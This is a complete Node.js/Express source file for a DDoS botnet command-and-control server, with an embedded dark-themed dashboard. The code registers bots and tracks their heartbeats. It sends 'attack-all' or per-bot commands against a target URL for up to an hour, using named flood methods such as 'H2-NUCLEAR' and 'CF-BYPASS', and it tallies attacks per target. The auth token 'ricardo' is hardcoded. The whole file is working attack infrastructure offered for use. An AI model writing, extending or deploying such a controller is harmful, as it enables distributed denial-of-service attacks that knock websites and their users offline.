const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";

app.set('trust proxy', 1);

// Rate limiting (skip UI and ping)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  skip: (req) => req.path === '/' || req.path === '/ping' || req.path === '/dashboard',
  keyGenerator: (req) => req.ip || req.connection.remoteAddress || 'unknown'
});
app.use('/api/', limiter);

// Auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// ========== DATA STORES ==========
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

let serverStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  startTime: Date.now(),
  uptime: 0
};

const BOT_TIMEOUT = 30000;

// ========== CLEANUP ==========
function cleanupInactiveBots() {
  const now = Date.now();
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen < BOT_TIMEOUT);
  if (before !== connectedBots.length) {
    serverStats.totalBots = connectedBots.length;
    console.log(`[CLEANUP] Removed ${before - connectedBots.length} inactive bots`);
  }
}

function updateAttackingStatus() {
  const now = Date.now();
  for (const bot of connectedBots) {
    if (bot.attacking && bot.attackEndTime && now >= bot.attackEndTime) {
      bot.attacking = false;
      bot.attackEndTime = 0;
      serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
    }
  }
}

setInterval(() => {
  cleanupInactiveBots();
  updateAttackingStatus();
  serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
}, 5000);

// ========== METHOD FILES MAPPING (UPDATED) ==========
const methodFiles = {
  // NEW H2-NUCLEAR METHODS
  'H2-NUCLEAR': 'methods/h2-nuclear.js',
  'H2N': 'methods/h2-nuclear.js',
  'H2N-MAX': 'methods/h2-nuclear.js',
  
  // Existing methods
  'RAW-GET': 'methods/raw-get.js',
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'BYPASS': 'methods/BYPASS.js',
  'VHOLD': 'methods/vhold.js',
  'W-FLOOD': 'methods/w-flood1.js',
  'STRESS': 'methods/curl-stress.js',
  'CURL-SPAM': 'methods/curl-stress.js',
  'RAPID10': 'methods/r10-rapid.js',
  'R10': 'methods/r10-rapid.js'
};

// ========== BOT ENDPOINTS ==========
app.post('/register', (req, res) => {
  const { id, name, url } = req.body;
  if (!id) return res.status(400).json({ error: 'Bot ID required' });

  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  let bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    bot.url = url || bot.url;
    bot.name = name || bot.name;
    return res.json({ message: 'Bot already registered', approved: true, bot });
  }

  const newBot = {
    id,
    name: name || `Bot-${id.slice(-6)}`,
    url: url || `http://localhost:${Math.floor(Math.random() * 10000) + 1000}`,
    registeredAt: new Date().toISOString(),
    lastSeen: Date.now(),
    attacking: false,
    attackEndTime: 0,
    attacksPerformed: 0
  };
  connectedBots.push(newBot);
  serverStats.totalBots = connectedBots.length;
  console.log(`[REGISTER] New bot: ${newBot.name} (${id})`);
  res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
});

app.post('/heartbeat', (req, res) => {
  const { id } = req.body;
  if (!id) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    return res.json({ status: 'ok' });
  }

  if (!blockedBots.has(id)) {
    const newBot = {
      id,
      name: `Bot-${id.slice(-6)}`,
      url: 'unknown',
      registeredAt: new Date().toISOString(),
      lastSeen: Date.now(),
      attacking: false,
      attackEndTime: 0,
      attacksPerformed: 0
    };
    connectedBots.push(newBot);
    serverStats.totalBots = connectedBots.length;
    console.log(`[HEARTBEAT] Auto-registered bot: ${id}`);
    return res.json({ status: 'registered' });
  }
  res.status(403).json({ error: 'Bot is blocked' });
});

app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();

  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    console.log(`[COMMAND] Sending attack to ${botId}: ${command.methods} -> ${command.target}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  res.json({ hasCommand: false });
});

app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;
  serverStats.totalRequests += requests || 0;
  serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.lastReport = Date.now();
  }
  console.log(`[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

// ========== API ENDPOINTS (for UI) ==========
app.get('/bots', authenticate, (req, res) => {
  const now = Date.now();
  const botsWithStatus = connectedBots.map(bot => ({
    id: bot.id,
    name: bot.name,
    url: bot.url,
    lastSeen: bot.lastSeen,
    attacking: bot.attacking || false,
    online: (now - bot.lastSeen) < BOT_TIMEOUT,
    attacksPerformed: bot.attacksPerformed || 0
  }));
  res.json({ total: connectedBots.length, bots: botsWithStatus });
});

app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  res.json({
    totalAttacks: serverStats.totalAttacks,
    activeAttacks: serverStats.activeAttacks,
    totalRequests: serverStats.totalRequests,
    uptime: serverStats.uptime,
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget
  });
});

app.get('/attack-bot', authenticate, (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }
  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }
  const botObj = connectedBots.find(b => b.id === bot);
  if (!botObj) {
    return res.json({ success: false, error: 'Bot not found' });
  }
  botObj.attacking = true;
  botObj.attackEndTime = Date.now() + duration * 1000;
  pendingCommands[botObj.id] = {
    target: target,
    time: duration,
    methods: methods,
    timestamp: Date.now()
  };
  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;
  console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${botObj.name} (${botObj.id}) for ${duration}s`);
  res.json({ success: true, message: 'Command sent to bot' });
});

app.get('/attack-all', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.status(400).json({ success: false, error: 'Missing parameters: target, time, methods' });
  }
  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.status(400).json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const now = Date.now();
  const onlineBots = connectedBots.filter(b => (now - b.lastSeen) < BOT_TIMEOUT);
  if (onlineBots.length === 0) {
    return res.status(404).json({ success: false, error: 'No online bots available' });
  }

  let sentCount = 0;
  const failedBots = [];
  for (const bot of onlineBots) {
    try {
      bot.attacking = true;
      bot.attackEndTime = Date.now() + duration * 1000;
      pendingCommands[bot.id] = {
        target: target,
        time: duration,
        methods: methods,
        timestamp: Date.now()
      };
      sentCount++;
    } catch (error) {
      failedBots.push(bot.id);
    }
  }
  serverStats.totalAttacks += sentCount;
  serverStats.activeAttacks += sentCount;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + sentCount;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + sentCount;

  console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${sentCount}/${onlineBots.length} bots for ${duration}s`);
  res.json({
    success: true,
    message: `Attack sent to ${sentCount} bots`,
    sent: sentCount,
    total: onlineBots.length,
    failed: failedBots.length > 0 ? failedBots : undefined
  });
});

app.get('/stop-all', authenticate, (req, res) => {
  pendingCommands = {};
  for (const bot of connectedBots) {
    stopCommands.add(bot.id);
    bot.attacking = false;
    bot.attackEndTime = 0;
  }
  serverStats.activeAttacks = 0;
  console.log(`[STOP-ALL] Stopped all attacks on ${connectedBots.length} bots`);
  res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
});

app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot blocked' });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked' });
});

app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

app.get('/remove-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
});

app.get('/methods', authenticate, (req, res) => {
  const available = Object.keys(methodFiles).filter(name => {
    const filePath = path.join(__dirname, methodFiles[name]);
    return fs.existsSync(filePath);
  });
  res.json({ methods: available, total: available.length });
});

app.get('/ping', (req, res) => {
  res.json({
    alive: true,
    timestamp: Date.now(),
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', bots: connectedBots.length, uptime: serverStats.uptime });
});

// ========== WEB UI (MODERN, NO EMOJIS) ==========
const HTML_UI = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C2 Dashboard</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #0a0e12;
      color: #e1e8f0;
      padding: 24px;
      min-height: 100vh;
    }

    .container {
      max-width: 1440px;
      margin: 0 auto;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 24px;
      background: linear-gradient(135deg, #141a20 0%, #1a2128 100%);
      border-radius: 16px;
      border: 1px solid #2a3440;
      margin-bottom: 24px;
      flex-wrap: wrap;
      gap: 16px;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .logo {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, #4a9eff, #6c5ce7);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 18px;
      color: white;
    }

    .header h1 {
      font-size: 22px;
      font-weight: 600;
      background: linear-gradient(135deg, #4a9eff, #6c5ce7);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .header-right {
      display: flex;
      align-items: center;
      gap: 16px;
      flex-wrap: wrap;
    }

    .status-indicator {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      color: #8b9bb5;
    }

    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #2ecc71;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }

    .login-box {
      display: flex;
      gap: 8px;
      align-items: center;
    }

    .login-box input {
      padding: 8px 14px;
      border-radius: 8px;
      border: 1px solid #2a3440;
      background: #0a0e12;
      color: #e1e8f0;
      font-size: 13px;
      width: 160px;
      transition: border-color 0.2s;
    }

    .login-box input:focus {
      outline: none;
      border-color: #4a9eff;
    }

    .btn {
      padding: 8px 18px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-size: 13px;
      font-weight: 600;
      transition: all 0.2s;
      color: white;
    }

    .btn-primary {
      background: linear-gradient(135deg, #4a9eff, #6c5ce7);
    }

    .btn-primary:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(74, 158, 255, 0.3);
    }

    .btn-success {
      background: linear-gradient(135deg, #00b894, #00a381);
    }

    .btn-success:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0, 184, 148, 0.3);
    }

    .btn-danger {
      background: linear-gradient(135deg, #e74c3c, #c0392b);
    }

    .btn-danger:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
    }

    .btn-secondary {
      background: #2a3440;
    }

    .btn-secondary:hover {
      background: #34465a;
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 24px;
    }

    .card {
      background: #141a20;
      border: 1px solid #2a3440;
      border-radius: 16px;
      padding: 24px;
      transition: border-color 0.2s;
    }

    .card:hover {
      border-color: #3a4a5a;
    }

    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
      padding-bottom: 12px;
      border-bottom: 1px solid #1e2630;
    }

    .card-title {
      font-size: 14px;
      font-weight: 600;
      color: #8b9bb5;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
      gap: 12px;
    }

    .stat-item {
      background: #0a0e12;
      padding: 16px;
      border-radius: 12px;
      text-align: center;
      border: 1px solid #1e2630;
    }

    .stat-value {
      font-size: 26px;
      font-weight: 700;
      color: #e1e8f0;
      line-height: 1.2;
    }

    .stat-value.primary { color: #4a9eff; }
    .stat-value.success { color: #2ecc71; }
    .stat-value.warning { color: #f39c12; }
    .stat-value.danger { color: #e74c3c; }

    .stat-label {
      font-size: 12px;
      color: #6a7a8a;
      margin-top: 4px;
    }

    .attack-form {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }

    .attack-form .full-width {
      grid-column: span 2;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 4px;
    }

    .form-group label {
      font-size: 12px;
      color: #6a7a8a;
      font-weight: 500;
    }

    .form-control {
      padding: 10px 14px;
      border-radius: 8px;
      border: 1px solid #2a3440;
      background: #0a0e12;
      color: #e1e8f0;
      font-size: 13px;
      transition: border-color 0.2s;
      width: 100%;
    }

    .form-control:focus {
      outline: none;
      border-color: #4a9eff;
    }

    .form-control option {
      background: #141a20;
    }

    .btn-group {
      display: flex;
      gap: 8px;
      grid-column: span 2;
    }

    .btn-group .btn {
      flex: 1;
    }

    .bot-list-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;
    }

    .bot-count {
      font-size: 13px;
      color: #6a7a8a;
    }

    .bot-list {
      max-height: 400px;
      overflow-y: auto;
    }

    .bot-list::-webkit-scrollbar {
      width: 6px;
    }

    .bot-list::-webkit-scrollbar-track {
      background: #0a0e12;
      border-radius: 3px;
    }

    .bot-list::-webkit-scrollbar-thumb {
      background: #2a3440;
      border-radius: 3px;
    }

    .bot-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 12px;
      border-bottom: 1px solid #1e2630;
      font-size: 13px;
      transition: background 0.2s;
      flex-wrap: wrap;
      gap: 8px;
    }

    .bot-item:hover {
      background: #1a2128;
    }

    .bot-info {
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }

    .bot-id {
      font-family: 'SF Mono', 'Menlo', 'Monaco', monospace;
      font-size: 12px;
      color: #4a9eff;
    }

    .bot-name {
      font-weight: 500;
    }

    .bot-status {
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .status-badge {
      padding: 2px 10px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 600;
    }

    .status-badge.online {
      background: rgba(46, 204, 113, 0.15);
      color: #2ecc71;
    }

    .status-badge.offline {
      background: rgba(231, 76, 60, 0.15);
      color: #e74c3c;
    }

    .status-badge.attacking {
      background: rgba(243, 156, 18, 0.15);
      color: #f39c12;
      animation: glow 1s infinite alternate;
    }

    @keyframes glow {
      from { opacity: 0.7; }
      to { opacity: 1; }
    }

    .bot-attacks {
      color: #6a7a8a;
      font-size: 12px;
    }

    .log-area {
      background: #0a0e12;
      border: 1px solid #2a3440;
      border-radius: 12px;
      padding: 16px;
      max-height: 200px;
      overflow-y: auto;
      font-family: 'SF Mono', 'Menlo', 'Monaco', monospace;
      font-size: 12px;
      line-height: 1.6;
      margin-top: 24px;
    }

    .log-area::-webkit-scrollbar {
      width: 6px;
    }

    .log-area::-webkit-scrollbar-track {
      background: transparent;
    }

    .log-area::-webkit-scrollbar-thumb {
      background: #2a3440;
      border-radius: 3px;
    }

    .log-entry {
      color: #6a7a8a;
    }

    .log-entry .time {
      color: #4a9eff;
    }

    .log-entry .success {
      color: #2ecc71;
    }

    .log-entry .error {
      color: #e74c3c;
    }

    .empty-state {
      text-align: center;
      padding: 40px 20px;
      color: #6a7a8a;
    }

    .empty-state .icon {
      font-size: 32px;
      margin-bottom: 8px;
      opacity: 0.3;
    }

    @media (max-width: 1024px) {
      .grid {
        grid-template-columns: 1fr;
      }
    }

    @media (max-width: 768px) {
      body { padding: 16px; }
      
      .header {
        flex-direction: column;
        align-items: stretch;
        padding: 16px;
      }
      
      .header-right {
        flex-direction: column;
        width: 100%;
      }
      
      .login-box {
        width: 100%;
      }
      
      .login-box input {
        flex: 1;
        width: auto;
      }
      
      .attack-form {
        grid-template-columns: 1fr;
      }
      
      .attack-form .full-width {
        grid-column: span 1;
      }
      
      .btn-group {
        grid-column: span 1;
        flex-direction: column;
      }
      
      .stats-grid {
        grid-template-columns: repeat(2, 1fr);
      }
      
      .bot-item {
        flex-direction: column;
        align-items: flex-start;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header class="header">
      <div class="header-left">
        <div class="logo">C2</div>
        <h1>Command & Control</h1>
      </div>
      <div class="header-right">
        <div class="status-indicator">
          <span class="status-dot"></span>
          <span>Online</span>
          <span style="color:#6a7a8a;">|</span>
          <span>Uptime: <strong id="uptime">0</strong>s</span>
        </div>
        <div class="login-box">
          <input type="password" id="tokenInput" placeholder="Auth Token" value="ricardo">
          <button class="btn btn-primary" onclick="login()">Connect</button>
        </div>
      </div>
    </header>

    <div class="grid">
      <div class="card">
        <div class="card-header">
          <span class="card-title">System Statistics</span>
        </div>
        <div class="stats-grid" id="statsGrid">
          <div class="stat-item">
            <div class="stat-value primary" id="statTotalBots">0</div>
            <div class="stat-label">Total Bots</div>
          </div>
          <div class="stat-item">
            <div class="stat-value success" id="statOnlineBots">0</div>
            <div class="stat-label">Online</div>
          </div>
          <div class="stat-item">
            <div class="stat-value warning" id="statActiveAttacks">0</div>
            <div class="stat-label">Active Attacks</div>
          </div>
          <div class="stat-item">
            <div class="stat-value" id="statTotalAttacks">0</div>
            <div class="stat-label">Total Attacks</div>
          </div>
          <div class="stat-item">
            <div class="stat-value" id="statTotalRequests">0</div>
            <div class="stat-label">Total Requests</div>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-header">
          <span class="card-title">Launch Attack</span>
        </div>
        <div class="attack-form">
          <div class="form-group full-width">
            <label for="attackTarget">Target URL</label>
            <input type="text" id="attackTarget" class="form-control" placeholder="https://example.com">
          </div>
          <div class="form-group">
            <label for="attackTime">Duration (seconds)</label>
            <input type="number" id="attackTime" class="form-control" value="60" min="1" max="3600">
          </div>
          <div class="form-group">
            <label for="attackMethod">Attack Method</label>
            <select id="attackMethod" class="form-control">
              <option value="H2-NUCLEAR">H2-NUCLEAR (HTTP/2 Flood)</option>
              <option value="H2N-MAX">H2N-MAX (Max Power)</option>
              <option value="RAW-GET">RAW-GET</option>
              <option value="CF-BYPASS">CF-BYPASS</option>
              <option value="MODERN-FLOOD">MODERN-FLOOD</option>
              <option value="HTTP-SICARIO">HTTP-SICARIO</option>
              <option value="RAW-HTTP">RAW-HTTP</option>
              <option value="R9">R9</option>
              <option value="PRIV-TOR">PRIV-TOR</option>
              <option value="HOLD-PANEL">HOLD-PANEL</option>
              <option value="R1">R1</option>
              <option value="UAM">UAM</option>
              <option value="W.I.L">W.I.L</option>
              <option value="BYPASS">BYPASS</option>
              <option value="VHOLD">VHOLD</option>
              <option value="W-FLOOD">W-FLOOD</option>
              <option value="STRESS">STRESS</option>
              <option value="CURL-SPAM">CURL-SPAM</option>
              <option value="RAPID10">RAPID10</option>
              <option value="R10">R10</option>
            </select>
          </div>
          <div class="btn-group">
            <button class="btn btn-success" onclick="attackAll()">Attack All Bots</button>
            <button class="btn btn-danger" onclick="stopAll()">Stop All</button>
          </div>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <span class="card-title">Bot Network</span>
        <span class="bot-count" id="botCount">0 bots</span>
      </div>
      <div style="display:flex; gap:8px; margin-bottom:12px; flex-wrap:wrap;">
        <button class="btn btn-secondary" onclick="refreshData()">Refresh</button>
        <button class="btn btn-danger" onclick="stopAll()">Stop All Attacks</button>
      </div>
      <div class="bot-list" id="botList">
        <div class="empty-state">
          <div class="icon">...</div>
          <div>Loading bots...</div>
        </div>
      </div>
    </div>

    <div class="log-area" id="logArea">
      <div class="log-entry"><span class="time">[System]</span> Dashboard initialized</div>
    </div>
  </div>

  <script>
    let token = localStorage.getItem("c2_token") || "ricardo";
    document.getElementById("tokenInput").value = token;

    function login() {
      token = document.getElementById("tokenInput").value;
      localStorage.setItem("c2_token", token);
      refreshData();
      addLog("System", "Connected to server", "success");
    }

    async function apiCall(endpoint, options = {}) {
      const headers = { "Authorization": token, ...options.headers };
      const res = await fetch(endpoint, { ...options, headers });
      if (res.status === 401) {
        addLog("Auth", "Unauthorized - check your token", "error");
        return null;
      }
      return res.json();
    }

    function addLog(source, message, type = "") {
      const area = document.getElementById("logArea");
      const time = new Date().toLocaleTimeString();
      const entry = document.createElement("div");
      entry.className = "log-entry";
      const cls = type ? ' class="' + type + '"' : '';
      entry.innerHTML = '<span class="time">[' + time + ']</span> <span' + cls + '>[' + source + ']</span> ' + message;
      area.appendChild(entry);
      area.scrollTop = area.scrollHeight;
    }

    async function refreshData() {
      try {
        const botsData = await apiCall("/bots");
        if (botsData) {
          const bots = botsData.bots || [];
          const list = document.getElementById("botList");
          if (bots.length === 0) {
            list.innerHTML = '<div class="empty-state"><div class="icon">-</div><div>No bots connected</div></div>';
          } else {
            list.innerHTML = bots.map(function(b) {
              let statusClass = "offline";
              let statusText = "Offline";
              if (b.online) {
                statusClass = "online";
                statusText = "Online";
              }
              if (b.attacking) {
                statusClass = "attacking";
                statusText = "Attacking";
              }
              return '<div class="bot-item">' +
                '<div class="bot-info">' +
                '<span class="bot-id">' + b.id + '</span>' +
                '<span class="bot-name">' + b.name + '</span>' +
                '</div>' +
                '<div class="bot-status">' +
                '<span class="status-badge ' + statusClass + '">' + statusText + '</span>' +
                '<span class="bot-attacks">Attacks: ' + b.attacksPerformed + '</span>' +
                '</div>' +
                '</div>';
            }).join("");
          }
          document.getElementById("botCount").textContent = bots.length + " bots";
        }

        const stats = await apiCall("/api/stats");
        if (stats) {
          document.getElementById("statTotalBots").textContent = stats.totalBots || 0;
          document.getElementById("statOnlineBots").textContent = stats.onlineBots || 0;
          document.getElementById("statActiveAttacks").textContent = stats.activeAttacks || 0;
          document.getElementById("statTotalAttacks").textContent = stats.totalAttacks || 0;
          document.getElementById("statTotalRequests").textContent = stats.totalRequests || 0;
          document.getElementById("uptime").textContent = stats.uptime || 0;
        }
      } catch (e) {
        addLog("Error", "Failed to refresh data: " + e.message, "error");
      }
    }

    async function attackAll() {
      const target = document.getElementById("attackTarget").value.trim();
      const time = document.getElementById("attackTime").value;
      const method = document.getElementById("attackMethod").value;
      if (!target) {
        addLog("Attack", "Please enter a target URL", "error");
        return;
      }
      addLog("Attack", "Sending attack-all: " + method + " -> " + target + " for " + time + "s");
      try {
        const result = await apiCall("/attack-all?target=" + encodeURIComponent(target) + "&time=" + time + "&methods=" + method);
        if (result && result.success) {
          addLog("Attack", "Attack sent to " + result.sent + "/" + result.total + " bots", "success");
          if (result.failed && result.failed.length) {
            addLog("Attack", "Failed bots: " + result.failed.join(", "), "error");
          }
        } else {
          addLog("Attack", "Attack failed: " + (result?.error || "Unknown error"), "error");
        }
      } catch (e) {
        addLog("Attack", "Error: " + e.message, "error");
      }
      refreshData();
    }

    async function stopAll() {
      addLog("System", "Stopping all attacks...");
      try {
        const result = await apiCall("/stop-all");
        if (result && result.success) {
          addLog("System", "All attacks stopped", "success");
        } else {
          addLog("System", "Failed to stop attacks", "error");
        }
      } catch (e) {
        addLog("System", "Error: " + e.message, "error");
      }
      refreshData();
    }

    setInterval(refreshData, 5000);
    login();
    refreshData();
  </script>
</body>
</html>`;

// Serve UI on root and dashboard
app.get(['/', '/dashboard'], (req, res) => {
  console.log(`[UI] Serving dashboard to ${req.ip}`);
  res.send(HTML_UI);
});

// Catch-all: serve UI for any non-API route
app.use((req, res, next) => {
  if (req.path.startsWith('/api') || req.path.startsWith('/bots') || req.path.startsWith('/attack') || req.path.startsWith('/stop') || req.path.startsWith('/block') || req.path.startsWith('/unblock') || req.path.startsWith('/remove') || req.path.startsWith('/blocked') || req.path.startsWith('/methods') || req.path.startsWith('/ping') || req.path.startsWith('/health')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.send(HTML_UI);
});

// ========== ERROR HANDLER ==========
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ========== START ==========
app.listen(port, () => {
  console.log('\n========================================');
  console.log('C2 SERVER WITH WEB UI READY');
  console.log('========================================');
  console.log('Port: ' + port);
  console.log('Auth Token: ' + AUTH_TOKEN);
  console.log('Open in browser: http://localhost:' + port);
  console.log('(or your Render URL)');
  console.log('========================================\n');

  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Proxies (ip:port)\n');
    console.log('[SETUP] Created proxy.txt');
  }
});
